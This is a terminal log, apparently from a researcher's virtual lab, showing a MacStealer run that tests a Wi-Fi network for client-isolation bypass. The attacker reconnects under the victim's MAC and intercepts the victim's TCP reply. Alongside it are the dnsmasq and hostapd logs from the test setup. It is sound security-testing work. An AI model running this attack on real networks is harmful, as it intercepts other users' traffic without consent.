(venv) root@dell:/home/martin/Repos/wifi-vulnerabilities-analysis/queue-security-context/mecstealer-virtual/research# ./macstealer.py wlan1 
[17:06:44] Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script
[17:06:44] Starting wpa_supplicant using: ../wpa_supplicant/wpa_supplicant -Dnl80211 -i wlan1 -c client.conf -W
Successfully initialized wpa_supplicant
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: Could not set interface 'p2p-dev-wlan1' UP
nl80211: deinit ifname=p2p-dev-wlan1 disabled_11b_rates=0
p2p-dev-wlan1: Failed to initialize driver interface
p2p-dev-wlan1: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
[17:06:44] Note: Victim and attacker are using the same password PSK{12345678}. In this scenario
[17:06:44]       the attack may be less damaging, see the Threat Model Discussion in README.md.
[17:06:44] Scanning for network and connecting as victim user...
wlan1: CTRL-EVENT-DSCP-POLICY clear_all
wlan1: SME: Trying to authenticate with 02:00:00:00:00:00 (SSID='testnetwork' freq=2412 MHz)
wlan1: Trying to associate with 02:00:00:00:00:00 (SSID='testnetwork' freq=2412 MHz)
wlan1: Associated with 02:00:00:00:00:00
wlan1: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan1: WPA: Key negotiation completed with 02:00:00:00:00:00 [PTK=CCMP GTK=CCMP]
wlan1: CTRL-EVENT-CONNECTED - Connection to 02:00:00:00:00:00 completed [id=1 id_str=victim]
[17:06:52] Sending DHCP discover with XID 1768899420
[17:06:52] Received DHCP offer for 192.168.100.34, sending DHCP request.
[17:06:52] Sending DHCP request with XID 1768899420
[17:06:52] DHCP ACK: Got IP address 192.168.100.34/02:00:00:00:01:00 with router at 192.168.100.1/02:00:00:00:00:00.
[17:06:52] Transmitting challenge TCP SYN packet to 8.8.8.8:443
[17:06:52] Transmitted packet: <Ether  dst=02:00:00:00:00:00 src=02:00:00:00:01:00 type=IPv4 |<IP  frag=0 proto=tcp src=192.168.100.34 dst=8.8.8.8 |<TCP  sport=2736 dport=https seq=38153037 |>>>
[17:06:52] Transmitted packet: <Ether  dst=02:00:00:00:00:00 src=02:00:00:00:01:00 type=IPv4 |<IP  frag=0 proto=tcp src=192.168.100.34 dst=8.8.8.8 |<TCP  sport=2736 dport=https seq=38153037 |>>>
[17:06:52] Received TCP response: <Ether  dst=02:00:00:00:01:00 src=02:00:00:00:00:00 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=44 id=0 flags=DF frag=0 ttl=119 proto=tcp chksum=0xcef1 src=8.8.8.8 dst=192.168.100.34 |<TCP  sport=https dport=2736 seq=3853876811 ack=38153038 dataofs=6 reserved=0 flags=SA window=65535 chksum=0xc56b urgptr=0 options=[('MSS', 1412)] |>>>
[17:06:52] Received TCP response: <Ether  dst=02:00:00:00:01:00 src=02:00:00:00:00:00 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=44 id=0 flags=DF frag=0 ttl=119 proto=tcp chksum=0xcef1 src=8.8.8.8 dst=192.168.100.34 |<TCP  sport=https dport=2736 seq=3853876811 ack=38153038 dataofs=6 reserved=0 flags=SA window=65535 chksum=0xc56b urgptr=0 options=[('MSS', 1412)] |>>>
[17:06:52] Reconnecting as the attacker...
wlan1: CTRL-EVENT-DISCONNECTED bssid=02:00:00:00:00:00 reason=3 locally_generated=1
wlan1: CTRL-EVENT-DSCP-POLICY clear_all
wlan1: SME: Trying to authenticate with 02:00:00:00:00:00 (SSID='testnetwork' freq=2412 MHz)
wlan1: Trying to associate with 02:00:00:00:00:00 (SSID='testnetwork' freq=2412 MHz)
wlan1: Associated with 02:00:00:00:00:00
wlan1: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan1: WPA: Key negotiation completed with 02:00:00:00:00:00 [PTK=CCMP GTK=CCMP]
wlan1: CTRL-EVENT-CONNECTED - Connection to 02:00:00:00:00:00 completed [id=0 id_str=attacker]
[17:06:52] Listening for replies to the victim's TCP SYN request...
[17:06:52] Sending DHCP request with XID 1768899420
[17:06:52] DHCP ACK: Got IP address 192.168.100.34/02:00:00:00:01:00 with router at 192.168.100.1/02:00:00:00:00:00.
[17:06:52] Received TCP response: <Ether  dst=02:00:00:00:01:00 src=02:00:00:00:00:00 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=44 id=0 flags=DF frag=0 ttl=119 proto=tcp chksum=0xcef1 src=8.8.8.8 dst=192.168.100.34 |<TCP  sport=https dport=2736 seq=3853876811 ack=38153038 dataofs=6 reserved=0 flags=SA window=65535 chksum=0xc56b urgptr=0 options=[('MSS', 1412)] |>>>
[17:06:52] >>> Attacker PSK{12345678} intercepted TCP SYN/ACK reply to victim PSK{12345678} after 0.1s.
[17:06:52] >>> This means the network is vulnerable!
[17:06:52] Closing daemon and cleaning up ...
wlan1: CTRL-EVENT-DISCONNECTED bssid=02:00:00:00:00:00 reason=3 locally_generated=1
wlan1: CTRL-EVENT-DSCP-POLICY clear_all
wlan1: CTRL-EVENT-DSCP-POLICY clear_all
nl80211: deinit ifname=wlan1 disabled_11b_rates=0
wlan1: CTRL-EVENT-TERMINATING 
(venv) root@dell:/home/martin/Repos/wifi-vulnerabilities-analysis/queue-security-context/mecstealer-virtual/rese


DHCP:

❯ sudo ./dnsmasq-start.sh
[*] Writing dnsmasq.conf
[*] Starting dnsmasq (foreground)
dnsmasq: started, version 2.90 DNS disabled
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.100.10 -- 192.168.100.200, lease time 8h
dnsmasq-dhcp: DHCPDISCOVER(wlan0) 02:00:00:00:01:00 
dnsmasq-dhcp: DHCPOFFER(wlan0) 192.168.100.34 02:00:00:00:01:00 
dnsmasq-dhcp: DHCPREQUEST(wlan0) 192.168.100.34 02:00:00:00:01:00 
dnsmasq-dhcp: DHCPACK(wlan0) 192.168.100.34 02:00:00:00:01:00 fragclient
dnsmasq-dhcp: DHCPREQUEST(wlan0) 192.168.100.34 02:00:00:00:01:00 
dnsmasq-dhcp: DHCPACK(wlan0) 192.168.100.34 02:00:00:00:01:00 fragclient


AP:

❯ sudo hostapd hostapd.conf -i wlan0
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED 
wlan0: STA 02:00:00:00:01:00 IEEE 802.11: authenticated
wlan0: STA 02:00:00:00:01:00 IEEE 802.11: associated (aid 1)
wlan0: AP-STA-CONNECTED 02:00:00:00:01:00
wlan0: STA 02:00:00:00:01:00 RADIUS: starting accounting session 9A149FADA7B3D7CB
wlan0: STA 02:00:00:00:01:00 WPA: pairwise key handshake completed (RSN)
wlan0: EAPOL-4WAY-HS-COMPLETED 02:00:00:00:01:00
wlan0: AP-STA-DISCONNECTED 02:00:00:00:01:00
wlan0: STA 02:00:00:00:01:00 IEEE 802.11: authenticated
wlan0: STA 02:00:00:00:01:00 IEEE 802.11: associated (aid 1)
wlan0: AP-STA-CONNECTED 02:00:00:00:01:00
wlan0: STA 02:00:00:00:01:00 RADIUS: starting accounting session 9EAC8FEB9E1AA9DA
wlan0: STA 02:00:00:00:01:00 WPA: pairwise key handshake completed (RSN)
wlan0: EAPOL-4WAY-HS-COMPLETED 02:00:00:00:01:00
wlan0: AP-STA-DISCONNECTED 02:00:00:00:01:00



